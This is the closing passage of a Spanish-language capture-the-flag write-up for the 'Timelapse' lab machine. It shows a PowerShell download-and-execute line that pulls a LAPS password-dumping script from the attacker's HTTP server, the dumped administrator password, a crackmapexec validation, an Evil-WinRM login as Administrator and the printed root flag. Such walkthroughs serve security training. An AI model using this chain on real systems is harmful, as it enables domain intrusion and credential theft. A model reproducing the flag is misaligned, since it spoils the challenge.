+<li>Ahora ejecutamos un servidor <strong>http</strong> con <strong>Python3</strong> para poder traernos el <strong>script</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+</code></pre></div></div>
+<ul>
+<li>Ahora lo descargamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8080/Get-LAPSPass
+words.ps1')
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; 
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.129.141.32 - - [26/Jul/2023 14:02:29] &quot;GET /Get-LAPSPasswords.ps1 HTTP/1.1&quot; 200 -
+</code></pre></div></div>
+<ul>
+<li>Ahora dumpeamos todas las credenciales.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; Get-LAPSPasswords
+
+
+Hostname   : dc01.timelapse.htb
+Stored     : 1
+Readable   : 1
+Password   : 09{z4]5BiSl,e$1d9!+t8GT#
+Expiration : 7/31/2023 7:01:37 PM
+
+Hostname   : dc01.timelapse.htb
+Stored     : 1
+Readable   : 1
+Password   : 09{z4]5BiSl,e$1d9!+t8GT#
+Expiration : 7/31/2023 7:01:37 PM
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   : dc01.timelapse.htb
+Stored     : 1
+Readable   : 1
+Password   : 09{z4]5BiSl,e$1d9!+t8GT#
+Expiration : 7/31/2023 7:01:37 PM
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   : dc01.timelapse.htb
+Stored     : 1
+Readable   : 1
+Password   : 09{z4]5BiSl,e$1d9!+t8GT#
+Expiration : 7/31/2023 7:01:37 PM
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; 
+</code></pre></div></div>
+<ul>
+<li>Vamos a validar si una de las contraseñas es del usuario <code>Administrator</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.129.141.32 -u 'Administrator' -p '09{z4]5BiSl,e$1d9!+t8GT#'
+SMB         10.129.141.32   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+SMB         10.129.141.32   445    DC01             [+] timelapse.htb\Administrator:09{z4]5BiSl,e$1d9!+t8GT# (Pwn3d!)
+</code></pre></div></div>
+<h2 id="root-txt">root.txt</h2>
+<ul>
+<li>Ahora nos conectamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ evil-winrm -S -i 10.129.141.32 -u 'Administrator' -p '09{z4]5BiSl,e$1d9!+t8GT#'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd C:\Users
+*Evil-WinRM* PS C:\Users&gt; dir -recurse root.txt
+
+
+    Directory: C:\Users\TRX\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/26/2023   7:01 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users&gt; type C:\Users\TRX\Desktop\root.txt
+ce3a58c7d90fbfcf1a8f22fa31375e8d
+*Evil-WinRM* PS C:\Users&gt; 
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
